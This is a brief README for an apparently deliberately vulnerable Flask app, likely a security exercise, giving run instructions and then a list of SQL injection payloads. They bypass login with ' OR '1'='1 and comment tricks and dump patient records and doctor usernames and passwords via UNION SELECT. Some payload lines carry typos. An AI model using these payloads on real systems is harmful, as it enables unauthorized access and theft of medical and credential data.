To run the app clone the repository, activate your virtual environment and install requirements.
Then run the line "flask run".

SQL injection

login
Usename and password= <<' OR '1'='1>>
or only use <<yaoming' -->>   without knowing the password
or use username   <<admin' UNION SELECT * FROM users -->>

search item

' OR '1'='1 : get all patient data
'UNION SELECT password, username FROM Doctor --  get usernames
'UNION SELECT uername,passsword FROM Doctor --  get passwords
